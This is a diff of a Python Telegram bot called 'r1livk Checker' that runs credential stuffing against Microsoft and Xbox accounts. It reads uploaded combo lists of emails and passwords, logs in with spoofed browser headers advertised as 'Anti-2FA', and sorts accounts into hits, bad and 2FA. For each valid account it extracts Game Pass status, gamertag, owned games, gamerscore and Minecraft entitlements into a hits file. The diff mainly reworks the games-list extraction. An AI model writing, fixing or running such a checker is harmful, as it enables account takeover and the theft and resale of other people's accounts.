@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Ultimate Pro Version with Enhanced Headers)
+r1livk Checker ⚡ - Telegram Bot (Final Fixed Games List Version)
 """
 
 import os
@@ -62,26 +62,19 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
     try:
         xsts_xb_payload = {
             "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
-            "RelyingParty": "https://displaycatalog.mp.microsoft.com",
+            "RelyingParty": "http://xboxlive.com",
             "TokenType": "JWT"
         }
         xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=10)
-        
-        if xsts_resp.status_code != 200:
-            xsts_xb_payload["RelyingParty"] = "http://xboxlive.com"
-            xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=10)
-
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
             headers = {
                 "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
-                "Accept-Language": "en-US"
+                "x-xbl-contract-version": "2"
             }
             
-            # 1. فحص اشتراكات الجيم باس
-            sub_headers = headers.copy()
-            sub_headers["x-xbl-contract-version"] = "2"
-            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=10)
+            # 1. فحص الجيم باس
+            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=headers, timeout=10)
             if sub_req.status_code == 200:
                 sub_data = sub_req.json()
                 for sub in sub_data.get("items", []):
@@ -90,47 +83,42 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                         game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                         break
 
-            # 2. جلب الـ XUID
-            inv_headers = headers.copy()
-            inv_headers["x-xbl-contract-version"] = "4"
-            
+            # 2. جلب الـ XUID بطريقة مضمونة من الـ Profile مباشرة
             xuid = None
-            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=inv_headers, timeout=10)
-            if people_resp.status_code == 200:
-                p_data = people_resp.json()
-                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
-                    xuid = p_data["profileUsers"][0].get("xuid")
+            prof_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=10)
+            if prof_req.status_code == 200:
+                try:
+                    xuid = prof_req.json().get("profileUsers", [{}])[0].get("id")
+                except:
+                    pass
 
             if not xuid:
-                prof_id_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=10)
-                if prof_id_req.status_code == 200:
-                    try:
-                        xuid = prof_id_req.json().get("profileUsers", [{}])[0].get("id")
-                    except:
-                        pass
+                people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, timeout=10)
+                if people_resp.status_code == 200:
+                    p_data = people_resp.json()
+                    if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
+                        xuid = p_data["profileUsers"][0].get("xuid")
 
-            # 3. سحب الألعاب عبر Inventory Entitlements API
+            # 3. سحب الألعاب حصرياً عبر Title History API
             if xuid:
-                entitlements_url = f"https://inventory.xboxlive.com/users/xuid({xuid})/inventory/products?type=Game"
-                ent_resp = session.get(entitlements_url, headers=inv_headers, timeout=10)
-                
-                if ent_resp.status_code == 200:
-                    ent_data = ent_resp.json()
+                history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
+                history_resp = session.get(history_url, headers=headers, timeout=10)
+                if history_resp.status_code == 200:
+                    history_data = history_resp.json()
                     counter = 1
-                    for item in ent_data.get("items", []):
-                        game_name = item.get("name") or item.get("title")
-                        if not game_name and "alternateIds" in item:
-                            for alt in item.get("alternateIds", []):
-                                if alt.get("idType") == "LegacyTitleId":
-                                    game_name = f"Xbox Game ID: {alt.get('value')}"
+                    for title in history_data.get("titles", []):
+                        t_name = title.get("name") or title.get("titleName")
+                        earned_gs = 0
+                        if "achievement" in title:
+                            earned_gs = title["achievement"].get("currentGamerscore", 0)
                         
-                        if game_name:
-                            owned_games_formatted.append(f"{counter} - {game_name} | Score: --G")
+                        if t_name:
+                            owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
                             counter += 1
                             if counter > 15:
                                 break
 
-            # 4. خطة بديلة: الإنجازات التفصيلية مع الـ Score الحقيقي
+            # 4. خطة أخيرة لو الـ History طلع فاضي، نسحب من الإندبوينت المباشر للإنجازات
             if not owned_games_formatted:
                 ach_url = "https://achievements.xboxlive.com/users/me/achievements"
                 ach_resp = session.get(ach_url, headers=headers, timeout=10)
@@ -171,7 +159,6 @@ def check_single_account(combo):
     session.mount('https://', adapter)
     session.mount('http://', adapter)
     
-    # تحسين الهيدرز لتحاكي متصفح حقيقي بالكامل وتجنب الـ 2FA الوهمي
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -231,7 +218,6 @@ def check_single_account(combo):
                 ms_token = token_match.group(1)
         
         if not ms_token:
-            # تدقيق حقيقي لضمان عدم تحويل الحسابات السليمة لـ 2FA وهمي
             if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs"]):
                 session.close()
                 return "twofa", None
@@ -326,7 +312,7 @@ def send_welcome(message):
         "Your Status: 👤 Free (0/10000 lines today)\n\n"
         "Features:\n"
         "• Xbox Game Pass & Subscriptions\n"
-        "• Pro Inventory & Games List\n"
+        "• Fixed Games List Extractor\n"
         "• Gamertag & Gamerscore\n"
         "• Minecraft Entitlements\n"
         "• Anti-2FA Browser Headers\n\n"
@@ -343,11 +329,11 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **r1livk Checker - Ultimate Mode**\n\n"
-            "Full account capture with advanced games extraction:\n"
+            "🎮 **r1livk Checker - Fixed Games List Mode**\n\n"
+            "Full account capture with fixed games extraction:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Inventory Games List\n"
+            "• Fixed Games List & Score\n"
             "• Gamertag & Profile\n"
             "• Anti-2FA Protection\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
@@ -380,7 +366,7 @@ def handle_docs(message):
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
-        bot.reply_to(message, "📥 File received. Starting Ultimate scan...")
+        bot.reply_to(message, "📥 File received. Starting scan with Fixed Games Extractor...")
         active_scans[chat_id] = True
         threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
 
@@ -402,7 +388,7 @@ def process_checker(chat_id, filepath):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_UltimateHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Checker_FixedHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -411,7 +397,7 @@ def process_checker(chat_id, filepath):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS (Ultimate Mode)**\n\n"
+        f"🔥 **LIVE SCAN STATS (Fixed Mode)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -501,7 +487,7 @@ def process_checker(chat_id, filepath):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **XBOX ULTIMATE SCAN COMPLETED!**\n\n"
+        f"✅ **XBOX FIXED SCAN COMPLETED!**\n\n"
         f"📊 Total: {total}\n"
         f"🎯 Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
@@ -515,12 +501,12 @@ def process_checker(chat_id, filepath):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Ultimate Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Fixed Hits File - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Ultimate Checker Bot is running...")
+    print("r1livk Fixed Games List Checker Bot is running...")
     bot.infinity_polling()
